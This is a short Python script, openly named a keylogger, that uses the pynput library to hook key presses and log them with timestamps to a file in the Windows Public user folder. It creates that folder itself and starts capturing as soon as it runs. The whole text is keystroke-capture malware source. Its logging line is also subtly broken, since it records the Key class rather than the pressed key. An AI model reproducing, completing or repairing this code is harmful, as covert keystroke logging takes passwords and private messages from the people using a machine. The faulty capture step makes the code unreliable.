from pynput.keyboard import Key, Listener
import logging
import os

class Keylogger():
    @staticmethod
    def run():
        '''Beschrijving'''
        keylogger_path = r"C:\Users\Public\keylogger"
        if not os.path.exists(keylogger_path):
            os.makedirs(keylogger_path)        
        log_dir = ""
        logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
	        level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def on_press(key):
            logging.info(str(Key))
        
        with Listener(on_press=on_press) as listener:
            listener.join()

Keylogger.run()